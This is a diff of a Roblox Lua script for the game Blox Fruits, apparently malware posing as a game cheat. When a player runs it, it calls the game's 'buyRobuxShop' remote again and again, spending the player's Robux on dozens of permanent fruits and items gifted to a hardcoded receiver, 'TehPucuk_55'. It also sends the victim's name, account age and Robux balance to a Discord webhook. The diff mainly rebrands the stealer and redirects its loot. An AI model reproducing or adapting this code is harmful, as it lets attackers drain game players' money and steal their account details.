@@ -12,6 +12,14 @@ local success, UserId = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
 end)
 
+local args = {
+    [1] = "buyRobuxShop",
+    [2] = {
+        ["StorageName"] = "2x EXP (15 mins.)",
+        ["FunnelId"] = "Shop",
+        ["PurchaseLocation"] = "Shop",
+    }
+}
 game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
 
 local CoreGui = game:GetService("CoreGui")
@@ -59,20 +67,20 @@ end)
 local function sendWebhook()
 
     local embed = {
-        ["title"] = "Dark Scripts - You Got Blox Fruit Hit! :owl:",
+        ["title"] = "Gaming Scripts - You Got Blox Fruit Hit! :apple:",
         ["color"] = 39423,
         ["fields"] = {
             {
-                ["name"] = "<:drawpen:1311079366125555782> á´˜ÊŸá´€Êá´‡Ê€ ÉªÉ´êœ°á´",
+                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                 ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
             },
             {
-                ["name"] = "<:robux:1314309850154537020> á´›á´á´›á´€ÊŸ Ê€á´Ê™á´œx",
+                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                 ["value"] = "```" .. result .. "```"
             },
             {
-                ["name"] = "á´…Éªêœ±á´„á´Ê€á´… sá´‡Ê€á´ á´‡Ê€",
-                ["value"] = "[**Join Invite**](https://discord.gg/darkscripts)",
+                ["name"] = "ᴅɪꜱᴄᴏʀᴅ sᴇʀᴠᴇʀ",
+                ["value"] = "[**Join Invite**](https://discord.gg/CAr4FZHAyF)",
             }
         }
     }
@@ -106,11 +114,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["PurchaseLocation"] = "FruitShop",
                 ["StorageName"] = "Permanent Dragon-Dragon",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -119,11 +127,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Kitsune-Kitsune",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -132,11 +140,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Leopard-Leopard",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -145,11 +153,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Fruit Notifier",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -159,11 +167,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Spirit-Spirit",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -173,11 +181,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Gas-Gas",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -187,11 +195,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Venom-Venom",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -201,11 +209,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Shadow-Shadow",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -215,11 +223,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Dough-Dough",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -229,11 +237,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent T-Rex-T-Rex",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -243,11 +251,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Gravity-Gravity",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -257,11 +265,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Blizzard-Blizzard",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -271,11 +279,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Pain-Pain",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -285,11 +293,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Rumble-Rumble",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -299,11 +307,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Portal-Portal",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -313,11 +321,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Sound-Sound",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -327,11 +335,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Spider-Spider",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -341,11 +349,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Love-Love",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -355,11 +363,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Buddha-Buddha",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -369,11 +377,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Quake-Quake",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -383,11 +391,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Magma-Magma",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -397,11 +405,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Ghost-Ghost",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -411,11 +419,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Barrier-Barrier",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -425,11 +433,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Dark Blade",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -439,11 +447,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Light-Light",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -453,11 +461,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Diamond-Diamond",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -467,11 +475,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Dark-Dark",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -481,11 +489,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Sand-Sand",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -495,11 +503,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Ice-Ice",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -509,11 +517,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Falcon-Falcon",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -523,11 +531,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Flame-Flame",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -537,11 +545,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "2x Money",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -551,11 +559,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "+1 Fruit Storage",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -565,11 +573,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Spike-Spike",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -579,11 +587,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "2x Boss Drops",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -592,11 +600,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Smoke-Smoke",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -605,11 +613,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Bomb-Bomb",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -619,11 +627,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Spring-Spring",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -633,11 +641,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Blade-Blade",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -647,11 +655,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "Permanent Spin-Spin",
                 ["PurchaseLocation"] = "FruitShop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -661,11 +669,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "10K Money",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
@@ -675,11 +683,11 @@ function stealitem()
         local args = {
             [1] = "buyRobuxShop",
             [2] = {
-                ["Message"] = "Dark On top",
+                ["Message"] = "Gaming On top",
                 ["StorageName"] = "2x EXP (15 mins.)",
                 ["PurchaseLocation"] = "Shop",
                 ["FunnelId"] = "Shop",
-                ["ReceiverName"] = Username,
+                ["ReceiverName"] = TehPucuk_55,
                 ["ReceiverUserId"] = UserId,
             }
         }
